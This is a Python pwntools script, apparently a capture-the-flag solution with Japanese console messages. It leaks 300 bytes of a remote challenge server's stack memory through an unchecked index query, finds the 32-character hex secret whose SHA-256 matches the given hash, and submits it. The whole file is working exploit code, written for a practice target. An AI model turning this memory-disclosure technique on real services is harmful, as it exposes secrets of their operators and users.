from pwn import *
import string
import hashlib

context.log_level = "info"

p = remote("34.170.146.252", 36195)

print("接続しました。ターゲットのハッシュを取得します...")
p.recvuntil(b"hash: ")
target_hash = p.recvline().strip().decode()
print(f"[*] Target Hash: {target_hash}")

p.recvline()

stack_data = bytearray()
print("スタックメモリをスキャン中")

for i in range(300):
    p.recvuntil(b"choice: ")
    p.sendline(b"?")
    p.recvuntil(b"index: ")
    p.sendline(str(i).encode())

    p.recvuntil(f"mem[{i}] = 0x".encode())
    val = int(p.recvline().strip(), 16)
    stack_data.append(val)

hex_chars = string.hexdigits.encode()
secret = None

for i in range(len(stack_data) - 32):
    chunk = stack_data[i : i + 32]

    if all(c in hex_chars for c in chunk):
        if hashlib.sha256(chunk).hexdigest() == target_hash:
            secret = chunk
            print(f"\nオフセット {i} で Secret を発見しました！")
            print(f"[*] Secret: {secret.decode()}")
            break

if secret:
    print("解答を送信します")
    p.recvuntil(b"choice: ")
    p.sendline(b"!")
    p.recvuntil(b"secret: ")
    p.sendline(secret)

    result = p.recvall(timeout=2).decode(errors="ignore")
    print("=" * 40)
    print(result.strip())
    print("=" * 40)
else:
    print("\nSecretが見つかりませんでした。スキャン範囲(range)を広げてみてください。")

p.close()
